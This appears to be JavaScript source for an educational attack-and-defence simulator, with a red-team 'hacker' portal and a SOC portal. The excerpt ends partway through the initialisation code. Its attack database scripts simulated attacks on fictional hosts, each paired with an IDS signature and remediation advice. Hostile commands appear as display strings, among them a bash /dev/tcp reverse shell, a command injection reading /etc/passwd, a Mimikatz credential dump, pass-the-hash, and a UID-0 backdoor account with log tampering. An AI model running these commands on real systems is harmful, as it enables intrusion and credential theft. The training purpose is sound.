// ================================================================
// ATTACK DATABASE
// ================================================================
const TARGETS = [
  {id:'web',name:'WEB-SERVER-01',ip:'10.0.1.10',os:'Ubuntu 22.04',services:'Apache 2.4, PHP 8.1, Port 80/443',desc:'Public-facing Apache web server with PHP application'},
  {id:'db',name:'DB-SERVER-01',ip:'10.0.1.20',os:'CentOS 8',services:'MySQL 8.0, Port 3306, SSH 22',desc:'Internal MySQL database server, restricted access'},
  {id:'dc',name:'DC-01',ip:'10.0.2.10',os:'Windows Server 2019',services:'LDAP 389, Kerberos 88, SMB 445, RDP 3389',desc:'Active Directory Domain Controller, critical infrastructure'},
  {id:'jump',name:'JUMP-HOST-01',ip:'10.0.3.10',os:'Debian 11',services:'SSH 22, Fail2ban active',desc:'SSH bastion/jump host for internal network access'},
  {id:'wks',name:'WKS-FINANCE-01',ip:'10.0.4.15',os:'Windows 10 22H2',services:'SMB 445, RDP 3389, Chrome',desc:'Finance department workstation, high-value target'},
];

const CATS = [
  {id:'recon',label:'Reconnaissance',color:'#818cf8',attacks:['nmap','service-enum','dns-enum','dir-brute']},
  {id:'exploit',label:'Exploitation',color:'#ef4444',attacks:['sqli','cmd-inject','path-trav','buffer-overflow']},
  {id:'creds',label:'Credential Attacks',color:'#f97316',attacks:['ssh-brute','pass-spray','pass-hash']},
  {id:'lateral',label:'Lateral Movement',color:'#f59e0b',attacks:['smb-relay','mimikatz','psexec']},
  {id:'persist',label:'Persistence',color:'#818cf8',attacks:['rev-shell','backdoor-user']},
];

const ATTACKS = {
  'nmap':{
    name:'Full Port Scan',tool:'Nmap 7.94',sev:'low',stealth:2,
    targetTypes:['web','db','dc','jump','wks'],
    desc:'Scans all 65535 TCP ports to map the target\'s attack surface. Very noisy.',
    params:[{label:'Scan Type',opts:['SYN Stealth (-sS)','TCP Full (-sT)','UDP (-sU)']}],
    lines:(t,p)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">nmap -sV -p- ${t.ip}</span>`,
      `[*] Starting Nmap 7.94 — https://nmap.org`,`[*] Host: ${t.name} (${t.ip})`,
      `[>] Scanning 65535 ports using ${p||'SYN Stealth'}...`,
      `[!] Discovered open port 22/tcp   (ssh)`,`[!] Discovered open port 80/tcp   (http)`,
      `[!] Discovered open port 443/tcp  (https)`,
      t.id==='db'?`[!] Discovered open port 3306/tcp (mysql)`:
      t.id==='dc'?`[!] Discovered open port 445/tcp  (smb)`:`[!] Discovered open port 8080/tcp (http-proxy)`,
      `[*] Nmap done: 1 IP address — ${t.id==='dc'?'12':t.id==='web'?'4':'6'} open ports`,
    ],
    sig:{rule:'IDS-2100014',cat:'Network Reconnaissance',conf:'HIGH',
      payload:(t)=>`SRC:192.168.1.99 → DST:${t.ip}, TCP flags=SYN, dport 1-65535 sequential in 12.4s`,
      desc:'Sequential TCP SYN packets to all ports within a short window is a classic port scan signature. Detected by Snort rule SID:2100014.',
      why:'Port scanning is the first step of every attack — mapping open ports reveals exploitable services.',
      recs:['Block source IP at perimeter firewall','Review IDS alert logs for follow-up activity','Check if scan was authorised penetration test'],
    },
    incTitle:'Network Port Scan Detected',incType:'Reconnaissance',
    incDesc:'Systematic scan of all 65535 ports detected. Pre-attack reconnaissance in progress.'
  },
  'service-enum':{
    name:'Service Enumeration',tool:'Netcat / WhatWeb',sev:'low',stealth:3,
    targetTypes:['web','db','jump'],
    desc:'Banner grabbing to identify software versions and OS fingerprinting.',
    params:[],
    lines:(t)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">nc -nv ${t.ip} 22 && whatweb ${t.ip}</span>`,
      `[*] Connecting to ${t.ip} port 22...`,`[!] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1`,
      `[*] Banner grabbed: OpenSSH 8.9p1 on Ubuntu 22.04`,
      `[*] WhatWeb scan: ${t.ip}`,`[!] Apache/2.4.54 PHP/8.1.12`,`[!] X-Powered-By: PHP/8.1.12`,
      `[+] Service versions identified — checking vulnerability databases...`,
    ],
    sig:{rule:'IDS-1100001',cat:'Service Enumeration',conf:'MEDIUM',
      payload:(t)=>`SRC:192.168.1.99 → DST:${t.ip}:22, TCP banner grab; HTTP HEAD request with WhatWeb UA`,
      desc:'Service enumeration via banner grabbing. HTTP User-Agent matched WhatWeb signature.',
      why:'Knowing exact software versions allows the attacker to find CVEs for those specific versions.',
      recs:['Suppress server banners (SSH, HTTP)','Enforce generic error pages','Monitor for vulnerability scanner UAs'],
    },
    incTitle:'Service Enumeration Attempt',incType:'Reconnaissance',
    incDesc:'Attacker is fingerprinting service versions to find vulnerabilities. Banners exposed.'
  },
  'dns-enum':{
    name:'DNS Enumeration',tool:'DNSEnum / Fierce',sev:'low',stealth:4,
    targetTypes:['web','dc'],
    desc:'Discovers subdomains, internal hostnames and zone transfer vulnerabilities.',
    params:[],
    lines:(t)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">dnsenum --dnsserver ${t.ip} corp.local</span>`,
      `[*] DNS Enumeration — corp.local`,`[>] Attempting zone transfer (AXFR)...`,
      `[!] Zone transfer SUCCESSFUL — records exposed!`,
      `[+] A    web01.corp.local     → 10.0.1.10`,`[+] A    db01.corp.local      → 10.0.1.20`,
      `[+] A    dc01.corp.local      → 10.0.2.10`,`[+] A    admin.corp.local     → 10.0.2.15`,
      `[+] Internal network map obtained via DNS zone transfer`,
    ],
    sig:{rule:'DNS-3000007',cat:'DNS Reconnaissance',conf:'HIGH',
      payload:(t)=>`SRC:192.168.1.99 → DST:${t.ip}:53, AXFR query for corp.local — zone transfer permitted`,
      desc:'DNS AXFR (zone transfer) query exposed all internal DNS records. Misconfigured DNS server allows unauthenticated zone transfers.',
      why:'Zone transfers expose the full internal network map — every hostname and IP address.',
      recs:['Disable AXFR for untrusted sources','Restrict DNS zone transfers to authorised secondaries only','Audit DNS server configuration immediately'],
    },
    incTitle:'DNS Zone Transfer — Internal Map Exposed',incType:'Reconnaissance',
    incDesc:'Zone transfer misconfiguration exposed full internal DNS records. All internal hosts revealed.'
  },
  'dir-brute':{
    name:'Directory Bruteforce',tool:'Gobuster / DirB',sev:'medium',stealth:2,
    targetTypes:['web'],
    desc:'Discovers hidden web directories, admin panels, and backup files.',
    params:[{label:'Wordlist',opts:['Common (500 words)','Medium (10k)','Full (200k)']}],
    lines:(t,p)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">gobuster dir -u http://${t.ip} -w ${p||'common.txt'}</span>`,
      `[*] Gobuster v3.6 | Mode: dir | Target: http://${t.ip}`,
      `[>] Scanning with wordlist (${p||'Common 500 words'})...`,
      `[+] /admin          (Status: 200) [admin panel!]`,
      `[+] /backup         (Status: 200) [backup files!]`,
      `[+] /config         (Status: 403)`,`[+] /api            (Status: 200)`,
      `[+] /wp-admin       (Status: 301)`,`[!] /backup/db.sql  (Status: 200) [DB BACKUP EXPOSED!]`,
    ],
    sig:{rule:'WAF-HTTP-5001',cat:'Web Enumeration',conf:'HIGH',
      payload:(t)=>`SRC:192.168.1.99 → DST:${t.ip}:80, 500 rapid HTTP GET requests in 2s — directory enumeration pattern`,
      desc:'Rapid sequential HTTP GET requests with path enumeration pattern. Matched Gobuster/DirBuster User-Agent and request frequency.',
      why:'Exposed /admin and /backup directories could allow direct access to admin panels and sensitive database files.',
      recs:['Block IP at WAF level','Enable rate limiting (max 20 req/s per IP)','Remove publicly accessible backup files immediately','Enable WAF rule set for scanner detection'],
    },
    incTitle:'Web Directory Bruteforce — Sensitive Paths Found',incType:'Web Enumeration',
    incDesc:'Directory enumeration exposed /admin panel and database backup file at /backup/db.sql.'
  },
  'sqli':{
    name:'SQL Injection',tool:'SQLMap / Manual',sev:'critical',stealth:3,
    targetTypes:['web','db'],
    desc:'Injects SQL commands into web input fields to extract or corrupt database data.',
    params:[{label:'Technique',opts:['UNION-based','Boolean Blind','Time Blind','Error-based']}],
    lines:(t,p)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">sqlmap -u "http://${t.ip}/login" --data="user=admin&pass=test" --dbs</span>`,
      `[*] SQLMap v1.7.9 | Target: http://${t.ip}/login`,
      `[>] Testing parameter 'user' — ${p||'UNION-based'} technique`,
      `[!] Parameter 'user' is injectable! Payload: ' OR '1'='1' --`,
      `[+] Backend DBMS: MySQL 8.0`,`[+] Available databases:`,
      `[+]   [*] information_schema`,`[+]   [*] corp_users`,`[+]   [*] financial_data`,
      `[!] Dumping table corp_users — 1,247 rows extracted`,
      `[!] Admin credentials: admin:$2b$12$hashed_password`,
    ],
    sig:{rule:'WAF-SQLI-0023',cat:'SQL Injection Attack',conf:'HIGH',
      payload:(t)=>`HTTP POST ${t.ip}/login, param 'user' contains: ' OR '1'='1' --; UNION SELECT statements detected`,
      desc:'Classic SQL injection payload in login form parameter. WAF signature WAF-SQLI-0023 matched UNION-based injection attempt. Database contents partially extracted.',
      why:'SQL injection can expose entire database contents including credentials, PII, and financial records. One of the most critical web vulnerabilities (OWASP A3).',
      recs:['Immediately take vulnerable endpoint offline','Implement parameterised queries / prepared statements','Enable WAF SQL injection ruleset','Rotate all database credentials','Assess what data was extracted and notify DPO if PII involved'],
    },
    incTitle:'SQL Injection — Database Credentials Extracted',incType:'Web Application Attack',
    incDesc:'UNION-based SQL injection succeeded. 1,247 user records and admin credentials extracted from corp_users table.'
  },
  'cmd-inject':{
    name:'Command Injection',tool:'Manual / Burp Suite',sev:'critical',stealth:3,
    targetTypes:['web'],
    desc:'Injects OS commands via unsanitised web form inputs — achieves RCE on server.',
    params:[],
    lines:(t)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">curl -X POST http://${t.ip}/ping -d "host=8.8.8.8;id;whoami"</span>`,
      `[*] Testing command injection in /ping endpoint`,`[>] Payload: host=8.8.8.8;id;whoami`,
      `[!] Response includes command output — VULNERABLE!`,`[+] uid=33(www-data) gid=33(www-data)`,
      `[>] Escalating: host=8.8.8.8;cat /etc/passwd`,`[!] /etc/passwd contents received (32 user accounts)`,
      `[>] Dropping reverse shell payload...`,`[!] Shell spawned: bash -i >& /dev/tcp/192.168.1.99/4444 0>&1`,
    ],
    sig:{rule:'WAF-RCE-0088',cat:'Remote Code Execution',conf:'HIGH',
      payload:(t)=>`HTTP POST ${t.ip}/ping, param 'host' contains shell metacharacters: ; id ; whoami — OS command output returned in HTTP response`,
      desc:'OS command injection via semicolon separator in HTTP POST parameter. Server executed attacker-controlled commands as www-data. Reverse shell subsequently established.',
      why:'Command injection gives the attacker direct shell access to the server. Severity: Critical — full server compromise.',
      recs:['Kill reverse shell connection immediately','Take web server offline for forensic review','Sanitise all user inputs — whitelist valid input characters','Never pass user input to shell commands','Enable SELinux/AppArmor to restrict what processes can execute'],
    },
    incTitle:'Command Injection — Remote Shell Access Gained',incType:'Remote Code Execution',
    incDesc:'OS command injection via /ping endpoint. Attacker executed arbitrary commands and established reverse shell as www-data.'
  },
  'path-trav':{
    name:'Path Traversal',tool:'Manual / Burp Suite',sev:'high',stealth:4,
    targetTypes:['web'],
    desc:'Uses ../ sequences to escape the web root and access arbitrary server files.',
    params:[],
    lines:(t)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">curl "http://${t.ip}/download?file=../../../../etc/passwd"</span>`,
      `[*] Testing path traversal in file download endpoint`,`[>] Payload: ../../../../etc/passwd`,
      `[!] Server returned file contents — VULNERABLE!`,
      `[+] root:x:0:0:root:/root:/bin/bash`,`[+] www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`,
      `[>] Attempting /etc/shadow...`,`[!] Access denied (insufficient permissions)`,
      `[>] Attempting web app config: ../../../../var/www/html/config.php`,`[!] DB password exposed: 'Sup3rS3cr3t!'`,
    ],
    sig:{rule:'WAF-TRAV-0041',cat:'Path Traversal Attack',conf:'HIGH',
      payload:(t)=>`HTTP GET ${t.ip}/download?file=../../../../etc/passwd — directory traversal sequences detected, /etc/passwd returned in response`,
      desc:'Path traversal using ../ sequences successfully escaped the web root. Server returned /etc/passwd contents and application config file containing database credentials.',
      why:'Path traversal allows reading any file the web server process can access — configs, credentials, source code, SSH keys.',
      recs:['Validate and sanitise all file path inputs','Implement a whitelist of allowed file paths','Run web server with minimal privileges','Rotate database credentials exposed in config.php','Enable chroot for web server processes'],
    },
    incTitle:'Path Traversal — Config Credentials Exposed',incType:'Web Application Attack',
    incDesc:'Directory traversal successful. /etc/passwd and database credentials in config.php accessed.'
  },
  'buffer-overflow':{
    name:'Buffer Overflow',tool:'Custom Exploit / Metasploit',sev:'critical',stealth:3,
    targetTypes:['web','jump'],
    desc:'Overflows a memory buffer to overwrite return addresses and execute shellcode.',
    params:[{label:'Target Service',opts:['Apache mod (CVE-2021-41773)','OpenSSH (custom)','Custom binary']}],
    lines:(t,p)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">python3 exploit.py --target ${t.ip} --payload shellcode.bin</span>`,
      `[*] Buffer Overflow Exploit — ${p||'Apache mod'}`,`[*] Target: ${t.ip}`,
      `[>] Fuzzing input length... crash at 1024 bytes`,`[>] Locating EIP offset: 1007 bytes`,
      `[>] Finding JMP ESP gadget: 0x625011af`,`[>] Crafting payload with NOP sled + shellcode`,
      `[!] Exploit sent — monitoring for shell...`,`[!] Shell received! Running as: root`,
      `[+] SYSTEM COMPROMISED — uid=0(root) gid=0(root)`,
    ],
    sig:{rule:'IDS-EXPLOIT-0199',cat:'Buffer Overflow Exploit',conf:'MEDIUM',
      payload:(t)=>`SRC:192.168.1.99 → DST:${t.ip}, oversized TCP payload (>1000 bytes) to service port, NOP sled pattern (0x90 × 200) detected`,
      desc:'Exploit signature matched: NOP sled (repeated 0x90 bytes) followed by shellcode pattern detected in TCP payload. Process crash and restart observed post-delivery.',
      why:'Successful buffer overflows can give full root/SYSTEM access to the server. One of the most severe exploit types.',
      recs:['Immediately isolate affected host','Take memory dump for forensics','Apply security patches for identified CVE','Enable ASLR, DEP, and stack canaries','Conduct full system integrity check — attacker had root'],
    },
    incTitle:'Buffer Overflow — Root Privilege Obtained',incType:'Memory Corruption Exploit',
    incDesc:'Buffer overflow exploit delivered shellcode. Attacker gained root shell. Full system compromise confirmed.'
  },
  'ssh-brute':{
    name:'SSH Brute Force',tool:'Hydra / Medusa',sev:'medium',stealth:1,
    targetTypes:['jump','web','db'],
    desc:'Automated password guessing against SSH login using a wordlist.',
    params:[{label:'Wordlist',opts:['Top-100 passwords','Rockyou (14M)','Custom wordlist']}],
    lines:(t,p)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">hydra -l admin -P ${p||'rockyou.txt'} ssh://${t.ip}</span>`,
      `[*] Hydra v9.5 | Target: ssh://${t.ip} | Login: admin`,
      `[>] Testing passwords from ${p||'Rockyou (14M)'}...`,
      `[>] [22][ssh] Attempt: admin:password123  → FAIL`,`[>] [22][ssh] Attempt: admin:admin2024   → FAIL`,
      `[>] [22][ssh] Attempt: admin:Summer2023! → FAIL`,`[>] [22][ssh] Attempt: admin:Welc0me!    → FAIL`,
      `[!] [22][ssh] Attempt: admin:P@ssw0rd1   → SUCCESS!`,
      `[+] Credentials found: admin / P@ssw0rd1`,
    ],
    sig:{rule:'IDS-BRUTE-1001',cat:'Brute Force Authentication Attack',conf:'HIGH',
      payload:(t)=>`SRC:192.168.1.99 → DST:${t.ip}:22, 847 failed SSH auth attempts in 30s — automated brute force pattern`,
      desc:'Automated SSH login attempts at 28 attempts/second, characteristic of Hydra/Medusa brute force tools. Fail2ban should have triggered but was bypassed via low-and-slow variant.',
      why:'Successful credential brute force gives direct SSH access. Admin credentials allow full system control.',
      recs:['Immediately change compromised credentials','Enable multi-factor authentication on SSH','Implement account lockout (max 5 attempts)','Enforce SSH key-based auth, disable passwords','Add attacker IP to permanent blocklist'],
    },
    incTitle:'SSH Brute Force — Admin Credentials Compromised',incType:'Authentication Attack',
    incDesc:'847 failed SSH login attempts. Attacker successfully guessed admin:P@ssw0rd1 via dictionary attack.'
  },
  'pass-spray':{
    name:'Password Spray',tool:'Spray / Custom',sev:'medium',stealth:4,
    targetTypes:['dc','wks'],
    desc:'Tries a few common passwords against many accounts — evades lockout policies.',
    params:[{label:'Target Protocol',opts:['Active Directory (LDAP)','Office 365','Web Login']}],
    lines:(t,p)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">spray.py -target ${t.ip} -userlist users.txt -password "Winter2024!"</span>`,
      `[*] Password Spray Attack — ${p||'Active Directory (LDAP)'}`,`[*] Loaded 250 usernames from users.txt`,
      `[*] Password: Winter2024! (spraying 1 password across all accounts)`,
      `[>] Spraying... (rate limited to avoid lockout)`,
      `[>] j.smith        → FAIL`,`[>] a.jones        → FAIL`,`[>] m.chen         → FAIL`,
      `[!] f.parker       → SUCCESS! Domain account compromised`,
      `[+] Gained access as: f.parker@corp.local (Domain User)`,
    ],
    sig:{rule:'IDS-SPRAY-2002',cat:'Password Spray Attack',conf:'MEDIUM',
      payload:(t)=>`SRC:192.168.1.99 → DST:${t.ip}:389, same password tested against 250 different AD accounts in 60s — 3 failures/account (below lockout threshold of 5)`,
      desc:'Password spray signature: single password tested across many accounts at rate designed to avoid account lockout. Harder to detect than traditional brute force.',
      why:'Stays below lockout thresholds so it is stealthier than brute force. Even one success provides a foothold in the domain.',
      recs:['Enable Azure AD Smart Lockout / AD Password Protection','Investigate f.parker account — reset password, check recent activity','Audit all accounts for unusual login times or locations','Enable MFA for all domain accounts'],
    },
    incTitle:'Password Spray — Domain Account Compromised',incType:'Authentication Attack',
    incDesc:'Low-and-slow password spray bypassed lockout policies. Domain user f.parker compromised.'
  },
  'pass-hash':{
    name:'Pass-the-Hash',tool:'pth-winexe / Mimikatz',sev:'critical',stealth:4,
    targetTypes:['dc','wks'],
    desc:'Uses captured NTLM password hashes to authenticate without knowing the plaintext.',
    params:[],
    lines:(t)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' //${t.ip} cmd</span>`,
      `[*] Pass-the-Hash Attack — Target: ${t.ip}`,`[*] NTLM Hash: 8846f7eaee8fb117ad06bdd830b7586c`,
      `[>] Authenticating with hash (no plaintext needed)...`,
      `[!] Authentication succeeded — NTLM accepted hash directly`,`[+] Remote shell: ${t.name}\\Administrator`,
      `[>] Checking privileges...`,`[+] whoami /priv: SeImpersonatePrivilege ENABLED`,
      `[!] Administrative shell obtained — Domain Admin context`,
    ],
    sig:{rule:'IDS-PTH-4004',cat:'Pass-the-Hash Attack',conf:'HIGH',
      payload:(t)=>`SRC:192.168.1.99 → DST:${t.ip}:445, SMB NTLM auth with reused hash — NTLMv2 without prior Kerberos ticket (anomaly)`,
      desc:'Pass-the-Hash detected via NTLM authentication anomaly — successful auth without corresponding Kerberos TGT request. Classic indicator of hash-based lateral movement.',
      why:'PtH completely bypasses password requirements. With Domain Admin hash, attacker has full control of Active Directory — all systems.',
      recs:['EMERGENCY: Rotate all domain admin credentials immediately','Enable Protected Users Security Group (blocks NTLM for admins)','Deploy Microsoft Credential Guard','Audit all recent admin authentications for lateral movement','Consider domain controller isolation until hash rotation complete'],
    },
    incTitle:'Pass-the-Hash — Domain Admin Shell Obtained',incType:'Credential Exploitation',
    incDesc:'NTLM hash replay successful. Domain Admin privileges obtained without knowing plaintext password. Critical AD compromise.'
  },
  'smb-relay':{
    name:'SMB Relay Attack',tool:'Responder + ntlmrelayx',sev:'critical',stealth:4,
    targetTypes:['dc','wks'],
    desc:'Intercepts and relays NTLM authentication to gain access to other systems.',
    params:[],
    lines:(t)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">responder -I eth0 & ntlmrelayx.py -t ${t.ip}</span>`,
      `[*] Responder listening for NTLM auth broadcasts`,`[>] Poisoning LLMNR/NBT-NS queries on network...`,
      `[!] Captured NTLM auth from: WKS-FINANCE-01 (user: m.johnson)`,`[>] Relaying hash to ${t.ip}...`,
      `[!] Relay successful — authenticated as m.johnson on ${t.name}`,
      `[>] Dumping SAM database via secretsdump...`,`[!] Administrator:500:HASH dumped`,
      `[+] Local admin hash captured — can now move laterally to all hosts`,
    ],
    sig:{rule:'IDS-RELAY-5003',cat:'NTLM Relay Attack',conf:'HIGH',
      payload:(t)=>`Network: LLMNR/NBT-NS poisoning detected. NTLM credentials from WKS-FINANCE-01 relayed to ${t.ip}:445. Same auth session originated from different IP than expected`,
      desc:'NTLM relay attack via Responder LLMNR poisoning. Legitimate user credentials intercepted and relayed to domain controller without user\'s knowledge.',
      why:'SMB relay attacks can compromise multiple systems using legitimate user credentials. No passwords needed — just network position.',
      recs:['Disable LLMNR and NBT-NS network protocols immediately','Enable SMB Signing on all hosts (prevents relay)','Enable LDAP signing and channel binding','Segment network to reduce blast radius','Alert user m.johnson and reset credentials'],
    },
    incTitle:'SMB Relay — NTLM Credentials Intercepted and Relayed',incType:'Lateral Movement',
    incDesc:'LLMNR poisoning intercepted m.johnson credentials and relayed to DC. Local admin hash extracted.'
  },
  'mimikatz':{
    name:'Credential Dump (Mimikatz)',tool:'Mimikatz 2.2',sev:'critical',stealth:3,
    targetTypes:['dc','wks'],
    desc:'Extracts plaintext passwords, hashes, and Kerberos tickets from LSASS memory.',
    params:[],
    lines:(t)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit</span>`,
      `[*] Mimikatz 2.2.0 — Benjamin Delpy`,`[*] Target: ${t.name}`,
      `[>] SeDebugPrivilege obtained`,`[>] Dumping LSASS memory...`,
      `[!] * Username : administrator`,`[!] * Domain   : CORP`,
      `[!] * Password : C0rp@dmin2024!`,`[!] * NTLM     : a87f3a337d73085c45f9416be5787d86`,
      `[!] * Username : m.johnson`,`[!] * Password : Summer2024!`,
      `[+] 4 plaintext credentials dumped from LSASS`,
    ],
    sig:{rule:'EDR-LSASS-6001',cat:'LSASS Memory Access',conf:'HIGH',
      payload:(t)=>`${t.ip}: Unsigned process accessed LSASS.exe process memory (PID 576) with PROCESS_VM_READ rights — Mimikatz signature`,
      desc:'EDR alert: process mimikatz.exe accessed LSASS memory with VM_READ permissions. This is the primary credential harvesting technique. SeDebugPrivilege was elevated.',
      why:'LSASS stores credentials in memory for SSO. Dumping it reveals plaintext passwords for all logged-in users, enabling complete lateral movement.',
      recs:['Immediately isolate affected host','Rotate ALL credentials for accounts that had active sessions on this host','Enable Windows Credential Guard (prevents plaintext storage)','Block SeDebugPrivilege for non-SYSTEM processes','Run AV/EDR scan for mimikatz artifacts'],
    },
    incTitle:'Mimikatz — Plaintext Credentials Dumped from LSASS',incType:'Credential Harvesting',
    incDesc:'Mimikatz executed on DC. 4 plaintext credentials extracted including domain admin password.'
  },
  'psexec':{
    name:'Remote Execution (PsExec)',tool:'PsExec / Impacket',sev:'high',stealth:3,
    targetTypes:['dc','wks'],
    desc:'Executes commands remotely on Windows hosts using SMB and admin shares.',
    params:[],
    lines:(t)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">psexec.py corp/administrator:'C0rp@dmin2024!'@${t.ip} cmd.exe</span>`,
      `[*] Impacket PsExec — Target: ${t.ip}`,`[*] Uploading PSEXESVC.exe to \\\\${t.ip}\\ADMIN$`,
      `[!] Service PSEXESVC created and started`,`[*] Connecting to svcctl...`,
      `[!] Remote shell obtained: C:\\Windows\\system32>`,`[>] whoami`,
      `[!] nt authority\\system`,`[>] dir C:\\Users\\Administrator\\Desktop`,
      `[!] sensitive_data.xlsx    2,847,392 bytes`,
    ],
    sig:{rule:'EDR-PSEXEC-7002',cat:'Remote Code Execution via PsExec',conf:'HIGH',
      payload:(t)=>`${t.ip}: ADMIN$ share accessed, PSEXESVC.exe uploaded and executed as SYSTEM. SCM service creation via SMB detected`,
      desc:'PsExec signature matched: PSEXESVC.exe service binary written to ADMIN$ share and executed by Service Control Manager. Classic lateral movement technique.',
      why:'PsExec gives remote SYSTEM-level command execution. With admin credentials, can be used on every host in the domain.',
      recs:['Block SMB ADMIN$ and IPC$ shares from non-admin hosts','Create alert rule for PSEXESVC.exe service creation','Implement application whitelisting','Review what commands were run and what data was accessed','Rotate admin credentials used in the attack'],
    },
    incTitle:'PsExec — SYSTEM Shell on Domain Host',incType:'Lateral Movement',
    incDesc:'PsExec remote execution using stolen credentials. SYSTEM shell obtained on target. Sensitive files accessed.'
  },
  'rev-shell':{
    name:'Reverse Shell',tool:'Netcat / Bash',sev:'critical',stealth:3,
    targetTypes:['web','jump','wks'],
    desc:'Makes the victim machine connect back to the attacker — establishes persistent C2 channel.',
    params:[{label:'Shell Type',opts:['Bash TCP','Python3','PowerShell','PHP']}],
    lines:(t,p)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">nc -lvnp 4444  [listening for connection]</span>`,
      `[*] Netcat listener on port 4444`,`[>] Injecting payload via command injection: `,
      `[>] bash -i >& /dev/tcp/192.168.1.99/4444 0>&1`,`[!] Incoming connection from ${t.ip}:51234`,
      `[!] ${p||'Bash'} reverse shell established!`,`[>] id`,
      `[!] uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
      `[>] Installing persistence mechanism...`,`[+] C2 channel active — full interactive shell`,
    ],
    sig:{rule:'IDS-REVSHELL-8001',cat:'Reverse Shell / C2 Channel',conf:'HIGH',
      payload:(t)=>`SRC:${t.ip}:51234 → DST:192.168.1.99:4444, outbound TCP shell session. Bash stdin/stdout redirected to socket. Anomalous outbound connection from server process`,
      desc:'Outbound connection from www-data process to external IP on non-standard port. Shell I/O characteristics detected (interactive terminal over raw TCP). Classic reverse shell indicator.',
      why:'Reverse shells bypass inbound firewall rules by making the victim initiate the connection. Gives persistent interactive access.',
      recs:['Block outbound connections from server processes (application firewall)','Kill the connection: identify PID and terminate','Investigate how initial code execution was achieved','Implement egress filtering — servers should not connect to arbitrary external IPs','Enable auditd for exec syscall logging'],
    },
    incTitle:'Reverse Shell — Active C2 Channel Established',incType:'Command & Control',
    incDesc:'Reverse shell active from web server to attacker IP on port 4444. Interactive bash session established.'
  },
  'backdoor-user':{
    name:'Backdoor Account',tool:'useradd / net user',sev:'high',stealth:5,
    targetTypes:['web','jump','dc','wks'],
    desc:'Creates a hidden admin/root account for persistent access after the attack.',
    params:[{label:'Platform',opts:['Linux (useradd)','Windows (net user)','AD Domain User']}],
    lines:(t,p)=>[
      `<span class="prompt">root@attacker:~#</span> <span class="cmd">useradd -ou 0 -g 0 -s /bin/bash -p HASH svc-monitor</span>`,
      `[*] Creating backdoor account on ${t.name}`,`[*] Platform: ${p||'Linux'}`,
      `[>] useradd -ou 0 -g 0 svc-monitor  [UID=0 = root equivalent]`,`[>] Setting password...`,
      `[!] Account created: svc-monitor (UID=0)`,`[>] Adding to /etc/sudoers: svc-monitor ALL=(ALL) NOPASSWD:ALL`,
      `[>] Hiding from 'last' and wtmp logs...`,`[!] Entry cleared from auth logs`,
      `[+] Backdoor account active — persistent root access established`,
    ],
    sig:{rule:'EDR-PERSIST-9003',cat:'Persistence — Backdoor Account',conf:'MEDIUM',
      payload:(t)=>`${t.ip}: New user 'svc-monitor' created with UID=0 (root equivalent). /etc/sudoers modified. Auth log tampering detected`,
      desc:'Persistence mechanism detected: new user created with UID 0 (root-level privileges) by www-data process (unusual). Sudoers modification and log tampering observed.',
      why:'Backdoor accounts persist even after vulnerability patches. Gives the attacker a permanent way back in, disguised as a legitimate service account.',
      recs:['Delete backdoor account: userdel -r svc-monitor','Restore /etc/sudoers from last known good backup','Check all UID=0 accounts (should only be root)','Audit all user accounts created in last 24 hours','Implement file integrity monitoring (FIM) on /etc/passwd, /etc/sudoers'],
    },
    incTitle:'Backdoor Account Created — Persistent Root Access',incType:'Persistence',
    incDesc:'Backdoor account svc-monitor created with UID=0. Sudoers modified. Auth logs tampered to hide activity.'
  },
};

// ================================================================
// APPLICATION STATE
// ================================================================
const STATE = {
  portal:'hacker',
  target:null, cat:'recon', attack:null,
  isRunning:false,
  unread:0,
  stats:{total:0,detected:0,ghost:0},
  socAlerts:[],
  socIncidents:[],
  sastEntries:[],
  reports:[],
  hostHits:{},
  incCounter:1,
  rpCounter:1,
  filterInc:'all',
};

// ================================================================
// PORTAL SWITCHING
// ================================================================
function switchPortal(p) {
  STATE.portal = p;
  document.getElementById('hacker-portal').style.display = p==='hacker' ? 'flex' : 'none';
  document.getElementById('soc-portal').style.display = p==='soc' ? 'flex' : 'none';
  document.getElementById('tab-hack').classList.toggle('active', p==='hacker');
  document.getElementById('tab-soc').classList.toggle('active', p==='soc');
  if(p==='soc') { STATE.unread=0; updateBadge(); updateSOCMetrics(); }
}

function updateBadge() {
  const b = document.getElementById('sw-badge');
  const d = document.getElementById('sw-dot');
  b.textContent = STATE.unread;
  b.style.display = STATE.unread>0 ? 'block':'none';
  d.style.display = STATE.unread>0 ? 'inline-block':'none';
}

// ================================================================
// CLOCK
// ================================================================
function updateClock() {
  const n=new Date();
  const t=[n.getUTCHours(),n.getUTCMinutes(),n.getUTCSeconds()].map(v=>String(v).padStart(2,'0')).join(':');
  document.getElementById('s-clock').textContent = t+' UTC';
}
setInterval(updateClock,1000); updateClock();

// ================================================================
// HACKER PORTAL — INIT TARGETS & CATEGORIES
// ================================================================
function initHacker() {
  const tl = document.getElementById('target-list');
  TARGETS.forEach(t => {
    const d = document.createElement('div');
    d.className='target-card'; d.id='tgt-'+t.id;
    d.innerHTML=`<div class="tc-name">${t.name}</div><div class="tc-ip">${t.ip}</div><div class="tc-type">${t.os}</div>`;
    d.onclick = () => selectTarget(t.id);
    tl.appendChild(d);
  });
  const cl = document.getElementById('cat-list');
  CATS.forEach(c => {
    const d = document.createElement('button');
    d.className='cat-btn'+(c.id==='recon'?' active':''); d.id='cat-'+c.id;
